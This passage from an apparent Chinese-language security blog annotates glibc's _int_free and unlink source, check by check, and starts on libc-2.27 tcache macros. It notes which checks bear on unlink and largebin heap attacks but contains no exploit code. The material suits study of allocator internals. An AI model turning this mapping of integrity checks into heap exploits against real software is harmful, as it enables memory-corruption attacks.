class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="keyword">int</span> have_lock) <span class="comment">/* have_lock==0 */</span></span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;        <span class="comment">/* target chunk-&gt;size */</span></span><br><span class="line">    mfastbinptr* fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">    mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">    <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">    INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">    mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">    mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* errstr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    size = chunksize(p); <span class="comment">/* 获取目标chunk真正的大小 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect((<span class="keyword">uintptr_t</span>)p &gt; (<span class="keyword">uintptr_t</span>)-size, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">        <span class="comment">/* 检查1: 简单检查一下chunk头指针的合理性 &amp;&amp; 实现对齐后的chunk不为空 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">        <span class="keyword">if</span> (!have_lock &amp;&amp; locked) <span class="comment">/* 如果有互斥锁 */</span></span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex); <span class="comment">/* 互斥锁解锁 */</span></span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">        <span class="comment">/* 检查2: chunk的大小必须大于MINSIZE(4字) &amp;&amp; 检查chunk-&gt;size是否对齐 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check_inuse_chunk(av, p); <span class="comment">/* DE<span class="doctag">BUG:</span>检查chunk的前一个chunk是否不被使用 */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 根据if语句,觉得是否把chunk放入fastbin */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS <span class="comment">/* 允许fastbin和top chunk进行合并(附加一个if条件) */</span></span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">        <span class="comment">/* 附加if条件为:目标chunk不和top chunk相邻(否则进行合并) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* 不允许fastbin和top chunk进行合并(没有附加if条件) */</span></span></span><br><span class="line">        ) &#123;</span><br><span class="line">        <span class="comment">/* &lt;--情况1:将会把该chunk放入fastbin--&gt; */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 检查3: nextchunk-&gt;size必须大于2字,小于malloc_state-&gt;system_mem */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock <span class="comment">/* have_lock==0(表示没有锁) */</span></span><br><span class="line">                || (&#123; assert(locked == <span class="number">0</span>); <span class="comment">/* 断言没有锁 */</span></span><br><span class="line">                  mutex_lock(&amp;av-&gt;mutex); <span class="comment">/* 加互斥锁 */</span></span><br><span class="line">                  locked = <span class="number">1</span>;</span><br><span class="line">                  chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">                    || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">                    &#125;))</span><br><span class="line">                <span class="comment">/* 检查4: 加锁后重复检查3 */</span></span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!have_lock) <span class="comment">/* have_lock==0(恒成立) */</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex); <span class="comment">/* 解互斥锁 */</span></span><br><span class="line">                        locked = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ); <span class="comment">/* 将chunk的mem部分全部设置为perturb_byte */</span></span><br><span class="line"></span><br><span class="line">        set_fastchunks(av); <span class="comment">/* 设置fastchunks标记位 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">        fb = &amp;fastbin(av, idx); <span class="comment">/* 取出fastbin的头部 */</span></span><br><span class="line"></span><br><span class="line">        mchunkptr old = *fb, old2; <span class="comment">/* 使用原子操作,将P插入链表中 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">                <span class="comment">/* 检查5: 检查原链表头的chunk是否等于p,经典Double free检查 */</span></span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">                old_idx = fastbin_index(chunksize(old)); <span class="comment">/* 获取对应的下标 */</span></span><br><span class="line">            p-&gt;fd = old2 = old; <span class="comment">/* 让p的fd指针变为原来的头部 */</span></span><br><span class="line">        &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); <span class="comment">/* 如果fb等于old2，就将fb赋值为p */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>))</span><br><span class="line">            <span class="comment">/* 检查6: 先前的old_idx不属于当前的idx(说明修改了size),这个一般遇不到,因为从free到chunk进入fastbin的过程中,我们都是不能控制size的,一般都改不了size */</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123; </span><br><span class="line">        <span class="comment">/* &lt;--情况2:将会在其他未映射的块到达时合并chunk--&gt; */</span></span><br><span class="line">        <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">            (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nextchunk = chunk_at_offset(p, size); <span class="comment">/* 获取物理相邻的下一个chunk */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))</span><br><span class="line">            <span class="comment">/* 检查7: 将要合并的chunk不能是top chunk */</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(contiguous(av)</span><br><span class="line">            &amp;&amp; (<span class="keyword">char</span>*)nextchunk</span><br><span class="line">            &gt;= ((<span class="keyword">char</span>*)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">            <span class="comment">/* 检查8: nextchunk不能超出top chunk的范围 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">            <span class="comment">/* 检查9: &quot;nextchunk-&gt;P位==0&quot;不能成立(等于&quot;0&quot;表示chunk已经是free状态) */</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nextsize = chunksize(nextchunk); <span class="comment">/* 获取物理相邻的下一个chunk的大小 */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            <span class="comment">/* 检查10: nextchunk-&gt;size必须大于2字,小于malloc_state-&gt;system_mem */</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ); <span class="comment">/* 将chunk的mem部分全部设置为perturb_byte */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 后向合并(前一个chunk为free) */</span></span><br><span class="line">        <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize; <span class="comment">/* 合并chunk */</span></span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>)prevsize)); <span class="comment">/* 更新chunk-&gt;head */</span></span><br><span class="line">            unlink(av, p, bck, fwd); <span class="comment">/* 合并后的chunk脱链 */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">/* 表示nextchunk是否free(nextchunk-&gt;nextchunk-&gt;P位) */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 前向合并(后一个chunk为free) */</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">                unlink(av, nextchunk, bck, fwd); <span class="comment">/* 后一个chunk脱链 */</span></span><br><span class="line">                size += nextsize; <span class="comment">/* 进行合并(不需要更新chunk-&gt;head) */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 合并后的chunk插入unsortedbin的链表头 */</span></span><br><span class="line">            bck = unsorted_chunks(av); </span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">                <span class="comment">/* 检查11: 相当于 bck-&gt;fd-&gt;bk != bck,只要不破坏main_arena,通过这个检查应该没有什么问题(就是在进行main_arena劫持的时候,会造成影响) */</span></span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            p-&gt;fd = fwd;</span><br><span class="line">            p-&gt;bk = bck;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size)) <span class="comment">/* 如果属于largebin的范围 */</span></span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            bck-&gt;fd = p;</span><br><span class="line">            fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE); <span class="comment">/* 更新P位 */</span></span><br><span class="line">            set_foot(p, size);</span><br><span class="line"></span><br><span class="line">            check_free_chunk(av, p); <span class="comment">/* DE<span class="doctag">BUG:</span>简单检查 */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* &lt;--情况3:将会和top chunk进行合并--&gt; */</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">            check_chunk(av, p);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">            <span class="comment">/* 触发fastbin合并机制 */</span></span><br><span class="line">            <span class="keyword">if</span> (have_fastchunks(av)) <span class="comment">/* 如果存在fastbin就进行合并 */</span></span><br><span class="line">                malloc_consolidate(av); <span class="comment">/* 合并所有的fastbin */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM <span class="comment">/* 和heap_trim有关的标志位 */</span></span></span><br><span class="line">                <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">                    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">                    systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                heap_info* heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">                assert(heap-&gt;ar_ptr == av);</span><br><span class="line">                heap_trim(heap, mp_.top_pad); <span class="comment">/* 调用heap_trim尝试缩小该heap */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">            assert(locked);</span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        munmap_chunk(p); <span class="comment">/* 如果是mmap分配出来的chunk,直接进行回收 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在 free 函数就分析完毕了：</p>
<ul>
<li><code>__libc_free</code> 里真正进行free的函数是 <code>_int_free</code> 函数，首先执行 <code>__free_hook</code></li>
<li>然后该函数会判断当前释放的 chunk 是否为 fastbin（分3种情况）<ul>
<li>情况1:将会把该chunk放入fastbin<ul>
<li>查看当前的头部与释放的chunk是否一致</li>
<li>然后检查其 old chunk（原来的bin头）头部的 size 是否满足属于该 bin 的 idx 下标条件</li>
<li>最后插入对应 fastbin 的链表头</li>
</ul>
</li>
<li>情况2:将会在其他未映射的块到达时合并chunk<ul>
<li>判断该chunk应该进行“前向合并”，“后向合并”，还是两者都有</li>
<li>然后就是一堆检查</li>
<li>最后插入对应 unsortedbin 的链表头</li>
</ul>
</li>
<li>情况3:将会和top chunk进行合并<ul>
<li>进行 top chunk 合并</li>
<li>最后成为 top chunk 的一部分</li>
</ul>
</li>
</ul>
</li>
<li>接下来会判断是否触发 fastbin 合并机制<ul>
<li>会调用heap_trim尝试缩小该heap</li>
</ul>
</li>
<li>最后如果chunk是mmap出来的，则直接释放</li>
</ul>
<p>最后再看下 unlink 的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                           </span></span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))	</span><br><span class="line">        <span class="comment">/* 检查1: 检查nextchunk-&gt;bk是不是chunk,检查lastchunk-&gt;fd是不是chunk */</span></span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">/* 进行脱链 */</span>								      </span><br><span class="line">        FD-&gt;bk = BK;					      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">/* 如果检测到目标chunk属于largebin,并且chunk-&gt;fd_nextsize不为空 */</span></span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">            <span class="comment">/* 检查2: 检查1的largebin版本,主要用于横向链表(用fd_nextsize和bk_nextsize组织的链表,用于管理同一largebin中,不同size的large chunk) */</span></span><br><span class="line">	      malloc_printerr (check_action,				      </span><br><span class="line">			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">			       P, AV);					      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123; </span><br><span class="line">                <span class="comment">/* 表示largebin中:脱链chunk的下一个chunk不是纵向链表的链表头 */</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                    <span class="comment">/* 表示脱链chunk是当前largebin中唯一纵向链表的链表头 */</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize; <span class="comment">/* 继承p的fd_nextsize */</span></span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize; <span class="comment">/* 继承p的bk_nextsize */</span></span><br><span class="line">                    <span class="comment">/* p必须是纵向链表头,以下操作才有意义 */</span></span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD; </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123; <span class="comment">/* 表示脱链的chunk是纵向链表的链表头 */</span></span><br><span class="line">                <span class="comment">/* 如果某个纵向链表头脱链,则需要在纵向链表中完成脱链操作 */</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 unlink 的过程，会在 unlink 攻击中起作用</li>
<li>后面关于 largebin 的部分，则会在 largebin attack 中起作用</li>
</ul>
<h2 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h2><ul>
<li>杂项宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="meta">			  ? __alignof__ (long double) : 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和 arena 有关的宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      <span class="meta-keyword">if</span> (ptr) \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex); \</span></span><br><span class="line"><span class="meta">      <span class="meta-keyword">else</span> \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL); \</span></span><br><span class="line"><span class="meta">  &#125; while (0) <span class="comment">/* 对malloc_state-&gt;mutex进行加锁 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena; \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size); \</span></span><br><span class="line"><span class="meta">  &#125; while (0) <span class="comment">/* 从thread_arena获得一个分配区 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>和 tcache 有关的函数和结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64 <span class="comment">/* 最大tcachebin数量 */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1) <span class="comment">/* 最大tcachebin大小 */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ) <span class="comment">/* 根据TCACHE_MAX_BINS计算MAX_TCACHE_SIZE(固定值) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line"><span class="meta">  